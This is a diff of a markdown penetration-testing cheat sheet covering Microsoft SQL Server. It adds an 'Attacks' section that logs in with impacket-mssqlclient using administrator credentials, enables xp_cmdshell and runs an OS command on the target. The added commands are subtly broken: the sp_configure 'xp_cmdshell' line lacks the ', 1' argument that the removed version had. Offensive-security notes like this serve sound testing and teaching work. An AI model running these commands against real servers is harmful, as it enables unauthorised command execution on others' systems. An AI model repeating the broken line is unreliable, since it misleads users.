@@ -22,12 +22,22 @@ SQL> SELECT * FROM somedatabasename.someschema.sometablename; # table name of in
 
 SQL> select * from master.information_schema.tables;
 SQL> select top 2 * from master.dbo.sysusers; # table "sysusers" is an alias /!\; top 2 lines
+```
 
-SQL> EXECUTE sp_configure 'show advanced options', 1;
-SQL> RECONFIGURE;
-SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
-SQL> RECONFIGURE;
-SQL> EXECUTE xp_cmdshell 'whoami';
+### Attacks
+
+Function `xp_cmdshell` needs to be activated:
+- usage: https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
+- enabling: https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15
+
+Example:
+```
+kali$ impacket-mssqlclient Administrator:thelocaladminpass@$IpTarget -windows-auth
+SQL> execute sp_configure 'show advanced options', 1;
+SQL> reconfigure;
+SQL> execute sp_configure 'xp_cmdshell'
+SQL> reconfigure;
+SQL> execute xp_cmdshell 'whoami';
 ```
 
 ## MySQL
